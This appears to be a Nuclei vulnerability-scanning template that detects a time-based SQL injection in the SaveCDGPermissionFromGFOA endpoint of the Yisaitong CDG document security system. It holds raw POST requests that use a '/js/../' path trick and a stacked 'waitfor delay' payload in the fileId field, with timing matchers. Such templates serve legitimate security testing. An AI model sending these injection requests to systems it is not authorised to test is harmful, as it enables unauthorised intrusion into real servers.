id: yisaitong-CDG-SaveCDGPermissionFromGFOA-sqli

info:
  name: 亿赛通电子文档安全管理系统 SaveCDGPermissionFromGFOA sql注入
  author: HuanXiong
  severity: high
  description: |-
    
  reference:
    - 
  tags: SQL Injection

http:
  - raw:
      - |
        POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        fileId=1';waitfor delay '0:0:2'--+&pis=1
      - |
        POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        fileId=1';waitfor delay '0:0:3'--+&pis=1  

    matchers:
      - type: dsl
        condition: and
        dsl:
          - duration_2>=4  && duration_2<=6
          - duration_3>=6  && duration_3<=8